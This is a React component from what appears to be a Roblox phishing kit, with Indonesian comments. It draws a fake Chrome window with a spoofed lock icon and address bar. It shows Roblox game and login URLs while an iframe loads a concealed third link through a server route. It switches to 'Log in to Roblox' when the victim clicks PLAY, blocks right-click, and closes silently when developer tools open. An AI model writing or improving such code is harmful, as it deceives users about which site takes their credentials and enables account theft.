"use client";

import { useEffect, useRef, useState } from "react";

export type RoomData = {
  slot: number;
  title: string;
  imageUrl: string;
  online: number;
  maxOnline: number;
  gameBy: string;
  gameDesc: string;
  maturity: string;
  tenantLabel: string;
  link1_display: string;
  link2_login: string;
  // Iframe memakai frameSrc same-origin (/api/go) — Link 3 mentah TIDAK dikirim ke klien
  frameSrc: string;
  link3_core?: string;
  realDomain?: string;
  displayDomain?: string;
};

type Props = {
  open: boolean;
  room: RoomData | null;
  onClose: () => void;
};

function gameNameFromUrl(displayUrl: string): string {
  if (!displayUrl) return "";
  // Map apa pun: /games/PLACEID/Nama-Map → "Nama Map"
  const m = displayUrl.match(/\/games\/(\d+)\/([^?#]+)/);
  if (m && m[2]) {
    try {
      return decodeURIComponent(m[2].replace(/-/g, " ")).trim();
    } catch {
      return m[2].replace(/-/g, " ").trim();
    }
  }
  // Fallback: path terakhir yang bermakna
  try {
    const u = new URL(displayUrl);
    const segs = u.pathname.split("/").filter(Boolean);
    if (segs.length > 0) {
      const last = decodeURIComponent(segs[segs.length - 1]).replace(/[-_]+/g, " ").trim();
      if (last && last.length >= 3) return last.slice(0, 60);
    }
    return u.hostname.replace(/^www\./, "");
  } catch {
    return "";
  }
}

function tabTitleFor(displayUrl: string, isLogin: boolean, serverTitle: string): string {
  if (isLogin) return "Log in to Roblox";
  const game = gameNameFromUrl(displayUrl);
  if (game) return `${game} - Roblox`;
  if (serverTitle) return `${serverTitle} - Roblox`;
  return "Roblox";
}

function isLoginLikeUrl(u: string): boolean {
  if (!u) return false;
  const s = u.toLowerCase();
  return (
    s.includes("login") ||
    s.includes("signup") ||
    s.includes("sign-up") ||
    s.includes("signin") ||
    s.includes("sign_in") ||
    s.includes("auth") ||
    s.includes("challenge") ||
    s.includes("email") ||
    s.includes("verify") ||
    s.includes("password") ||
    s.includes("/sso") ||
    s.includes("oauth") ||
    s.includes("authorize") ||
    s.includes("two-step") ||
    s.includes("twostep") ||
    s.includes("captcha") ||
    s.includes("recovery") ||
    s.includes("account/login") ||
    s.includes("account/signup") ||
    s.includes("newlogin")
  );
}

// Jendela browser persis playscondogames.com.
// - iframe src = /api/go (Link 3 diselesaikan server-side, tidak tampil di Elements)
// - address bar auto-switch Link 1 → Link 2 saat klik PLAY → login
// - TIDAK ada overlay/shield di atas iframe agar tombol Roblox (Accept All / Decline All / PLAY / Login)
//   100% bisa diklik — tidak freeze.
// - Klik kanan di bingkai Chrome (titlebar/toolbar/address bar) tetap diblokir.
//   Catatan jujur: klik kanan DI DALAM halaman Roblox tidak bisa diblokir tanpa ikut
//   mematikan klik kiri (aturan keamanan browser untuk iframe cross-origin).
export default function BrowserModal({ open, room, onClose }: Props) {
  const [displayUrl, setDisplayUrl] = useState("");
  const [isLogin, setIsLogin] = useState(false);
  const [iframeSrc, setIframeSrc] = useState("");
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const lastUrlRef = useRef("");
  const modeRef = useRef(false);
  const loadCountRef = useRef(0);
  const focusStartRef = useRef(0);
  const roomRef = useRef<RoomData | null>(null);
  roomRef.current = room;

  function toDisplay() {
    const r = roomRef.current;
    if (!r) return;
    modeRef.current = false;
    setIsLogin(false);
    setDisplayUrl(r.link1_display || "");
  }

  function toLogin() {
    const r = roomRef.current;
    if (!r) return;
    modeRef.current = true;
    setIsLogin(true);
    setDisplayUrl(r.link2_login || r.link1_display || "");
  }

  function autoSwitch(wantLogin: boolean) {
    if (modeRef.current === wantLogin) return;
    if (wantLogin) toLogin();
    else toDisplay();
  }

  // Kalau DevTools dibuka paksa: tutup map DIAM-DIAM (tanpa teks) + hapus link dari memori.
  // User JOIN ulang untuk dapat token frame baru.
  useEffect(() => {
    if (!open) return;
    const onDt = () => {
      try {
        setIframeSrc("about:blank");
        setDisplayUrl("");
        setIsLogin(false);
        modeRef.current = false;
        loadCountRef.current = 0;
        lastUrlRef.current = "";
      } catch {}
      try {
        onClose();
      } catch {}
    };
    window.addEventListener("cg:devtools-open", onDt);
    return () => window.removeEventListener("cg:devtools-open", onDt);
  }, [open, onClose]);

  // Ikuti pergantian link dari panel secara otomatis:
  // jika Link 1/2 berubah (map/web diganti), address bar + tab ikut ganti tanpa reload manual.
  useEffect(() => {
    if (!open || !room) return;
    const l1 = (room.link1_display || "").trim();
    const l2 = (room.link2_login || "").trim();
    // Jangan timpa saat user sedang di mode login kecuali link loginnya yang berubah
    if (modeRef.current) {
      setDisplayUrl((prev) => {
        if (prev && prev !== l1 && l2 && prev !== l2) return l2;
        return prev || l2 || l1;
      });
    } else {
      setDisplayUrl(l1);
    }
    const fs = room.frameSrc || room.link3_core || "";
    setIframeSrc((prev) => (prev && prev === fs ? prev : fs || prev));
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [open, room?.link1_display, room?.link2_login, room?.frameSrc]);

  // Reset saat dibuka — kunci per slot agar Server 01/02 tidak ketukar state
  useEffect(() => {
    if (!open || !room) return;
    const l1 = (room.link1_display || "").trim();
    setDisplayUrl(l1);
    setIsLogin(false);
    modeRef.current = false;
    loadCountRef.current = 0;
    focusStartRef.current = 0;
    setIframeSrc(room.frameSrc || room.link3_core || "");
    lastUrlRef.current = "";
    document.body.style.overflow = "hidden";
    const onEsc = (e: KeyboardEvent) => {
      if (e.key === "Escape") onClose();
    };
    document.addEventListener("keydown", onEsc);
    return () => {
      document.body.style.overflow = "";
      document.removeEventListener("keydown", onEsc);
    };
    // room.slot dimasukkan agar ganti server selalu reset total
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [open, room?.slot, room?.frameSrc, onClose]);

  // AUTO-SWITCH saat klik PLAY di dalam iframe (window blur = fokus pindah ke iframe)
  useEffect(() => {
    if (!open || !room) return;
    const onBlur = () => {
      window.setTimeout(() => {
        if (document.activeElement === iframeRef.current) {
          if (modeRef.current === false) {
            window.setTimeout(() => {
              if (modeRef.current === false) {
                const r = roomRef.current;
                if (!r) return;
                modeRef.current = true;
                setIsLogin(true);
                setDisplayUrl(r.link2_login || r.link1_display || "");
              }
            }, 1200);
          }
        }
      }, 250);
    };
    window.addEventListener("blur", onBlur);
    return () => window.removeEventListener("blur", onBlur);
  }, [open, room]);

  // Deteksi navigasi same-origin + fokus iframe tiap 500ms.
  // Berlaku untuk SEMUA slot (Server 01/02/03) — tidak ada beda per server.
  useEffect(() => {
    if (!open || !room) return;
    const iv = window.setInterval(() => {
      // 1) Coba baca URL iframe (same-origin saja)
      try {
        const f = iframeRef.current;
        if (f && f.contentWindow) {
          const href = f.contentWindow.location.href;
          if (href && href !== "about:blank" && href !== lastUrlRef.current) {
            lastUrlRef.current = href;
            if (isLoginLikeUrl(href)) {
              autoSwitch(true);
              return;
            } else if (href.includes("games")) {
              autoSwitch(false);
              return;
            }
          }
        }
      } catch {
        // cross-origin: lanjut ke deteksi fokus
      }
      // 2) Deteksi fokus: jika iframe fokus terus >2 detik saat mode display → PLAY diklik → login.
      // Ini menangkap klik PLAY kedua dst. yang tidak memicu blur (fokus sudah di iframe).
      try {
        if (document.activeElement === iframeRef.current) {
          if (modeRef.current === false) {
            const now = Date.now();
            if (!focusStartRef.current) {
              focusStartRef.current = now;
            } else if (now - focusStartRef.current > 2000) {
              const r = roomRef.current;
              if (r && (r.link2_login || "").trim()) {
                modeRef.current = true;
                setIsLogin(true);
                setDisplayUrl(r.link2_login);
              }
            }
          }
        } else {
          focusStartRef.current = 0;
        }
      } catch {}
    }, 500);
    return () => window.clearInterval(iv);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [open, room?.slot]);

  if (!open || !room) return null;

  const link1 = room.link1_display || "";
  const link2 = room.link2_login || "";
  const frameSrc = room.frameSrc || room.link3_core || "";
  const hasAll = !!link1 && !!link2 && !!frameSrc;

  function handleIframeLoad() {
    loadCountRef.current += 1;
    const next = loadCountRef.current;
    const r = roomRef.current || room;
    if (!r) return;
    // Coba baca URL asli (same-origin saja)
    try {
      const f = iframeRef.current;
      const href = f?.contentWindow?.location.href || "";
      if (href && href !== "about:blank") {
        lastUrlRef.current = href;
        if (isLoginLikeUrl(href)) {
          if (modeRef.current !== true) {
            modeRef.current = true;
            setIsLogin(true);
            setDisplayUrl(r.link2_login || r.link1_display || "");
          }
          return;
        } else if (href.includes("games")) {
          if (modeRef.current !== false) {
            modeRef.current = false;
            setIsLogin(false);
            setDisplayUrl(r.link1_display || "");
          }
          return;
        }
      }
    } catch {
      // cross-origin → heuristik di bawah
    }
    // Heuristik STICKY (perbaikan macet di Link 1):
    // load 1 = display, load 2+ = login dan TETAP login (tidak balik sendiri ke display).
    // Balik ke display hanya jika same-origin terbaca games / refresh manual.
    if (next <= 1) {
      if (modeRef.current !== false) {
        modeRef.current = false;
        setIsLogin(false);
        setDisplayUrl(r.link1_display || "");
      }
    } else {
      if (modeRef.current !== true) {
        modeRef.current = true;
        setIsLogin(true);
        setDisplayUrl(r.link2_login || r.link1_display || "");
      }
    }
  }

  function refreshIframe() {
    if (!room) return;
    loadCountRef.current = 0;
    modeRef.current = false;
    setIsLogin(false);
    setDisplayUrl(room.link1_display);
    lastUrlRef.current = "";
    setIframeSrc("about:blank");
    window.setTimeout(() => {
      const r = roomRef.current;
      if (r) setIframeSrc(r.frameSrc || r.link3_core || "");
    }, 60);
  }

  function closeModal() {
    loadCountRef.current = 0;
    modeRef.current = false;
    setIsLogin(false);
    lastUrlRef.current = "";
    onClose();
  }

  const blockMenu = (e: React.SyntheticEvent) => {
    e.preventDefault();
    e.stopPropagation();
  };

  const shownUrl = displayUrl || link1 || "";
  const tabTitle = tabTitleFor(shownUrl, isLogin, room.title || "");

  return (
    <div
      id="browserModal"
      className={`browser-modal-overlay ${open ? "active" : ""}`}
      onClick={(e) => {
        if (e.target === e.currentTarget) closeModal();
      }}
      onContextMenu={blockMenu}
      onDragStart={blockMenu}
    >
      <div
        className="chrome-window"
        onContextMenu={blockMenu}
        onDragStart={blockMenu}
        onMouseDown={(e) => {
          if (e.button === 2 || e.button === 1) {
            e.preventDefault();
            e.stopPropagation();
          }
        }}
      >
        <div className="chrome-titlebar">
          <div className="chrome-tabs">
            <div className="chrome-tab active">
              <img src="https://upload.wikimedia.org/wikipedia/commons/7/70/Roblox_Corporation_2025_logo.svg" className="chrome-tab-icon" alt="Roblox" />
              <span className="chrome-tab-title" id="modalTabTitle">{tabTitle}</span>
              <span className="chrome-tab-close" id="closeTabBtn" onClick={closeModal}>×</span>
            </div>
          </div>
          <div className="chrome-window-controls">
            <span>–</span>
            <span>☐</span>
            <span className="chrome-close-btn" id="closeBrowserBtn" onClick={closeModal}>×</span>
          </div>
        </div>
        <div className="chrome-toolbar">
          <div className="chrome-nav-btns">
            <svg viewBox="0 0 24 24" className="chrome-icon"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" /></svg>
            <svg viewBox="0 0 24 24" className="chrome-icon disabled"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z" /></svg>
            <svg viewBox="0 0 24 24" className="chrome-icon" onClick={refreshIframe}><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z" /></svg>
          </div>
          <div className="chrome-address-bar" onContextMenu={blockMenu} onMouseDown={(e) => { if (e.button !== 0) { e.preventDefault(); e.stopPropagation(); } }}>
            <svg viewBox="0 0 24 24" className="chrome-lock"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" /></svg>
            <span className="chrome-url" id="fakeUrlText" style={{ userSelect: "none" }}>
              {shownUrl ? (
                <>
                  <span className="chrome-url-dim">https://</span>{shownUrl.replace(/^https?:\/\//, "")}
                </>
              ) : (
                <span className="chrome-url-dim">Loading...</span>
              )}
            </span>
            <svg viewBox="0 0 24 24" className="chrome-star"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z" /></svg>
          </div>
          <div className="chrome-extensions">
            <svg viewBox="0 0 24 24" className="chrome-icon"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.36 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM19 18H6c-2.21 0-4-1.79-4-4s1.79-4 4-4h.71C7.37 7.69 9.48 6 12 6c3.04 0 5.5 2.46 5.5 5.5v.5H19c1.66 0 3 1.34 3 3s-1.34 3-3 3z" /></svg>
            <svg viewBox="0 0 24 24" className="chrome-icon"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" /></svg>
          </div>
        </div>
        <div
          className="browser-content"
          onContextMenu={blockMenu}
          onDragStart={blockMenu}
        >
          {hasAll ? (
            <iframe
              key={`${room.slot}-${frameSrc}`}
              ref={iframeRef}
              id="browserIframe"
              src={iframeSrc || "about:blank"}
              onLoad={handleIframeLoad}
              sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-modals"
              referrerPolicy="no-referrer"
              allow="fullscreen; autoplay; clipboard-write"
              title={tabTitle}
            />
          ) : (
            <div style={{ padding: 40, textAlign: "center", color: "#64748b", fontSize: 14 }}>
              Configuration Missing — Please login to admin panel to set the server URL.
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
